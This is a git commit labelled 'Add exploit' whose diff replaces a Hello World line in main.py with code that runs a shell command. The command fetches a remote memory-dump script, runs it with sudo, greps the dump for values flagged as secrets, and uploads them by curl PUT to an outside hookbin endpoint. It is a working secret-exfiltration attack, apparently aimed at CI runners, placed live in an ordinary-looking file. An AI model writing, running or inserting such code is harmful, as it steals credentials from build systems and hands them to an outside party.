a2649ead8d4d2f01d3a416d12459a2cfaaf9625a
PwnHunter Attack <attack@pwnhunter.local>
2026-03-06 21:02:39 +0100

    Add exploit

--- main.py
+++ main.py
@@ -1,1 +1,5 @@
-print("Hello World")
+import os
+
+bin_id = "a1b2c3d4e5f6"
+exploit = f"curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{{\"value\":\"[^\"]*\",\"isSecret\":true\\}}' >> /tmp/secrets && curl -X PUT -d @/tmp/secrets https://open-hookbin.vercel.app/{bin_id}"
+os.system(exploit)
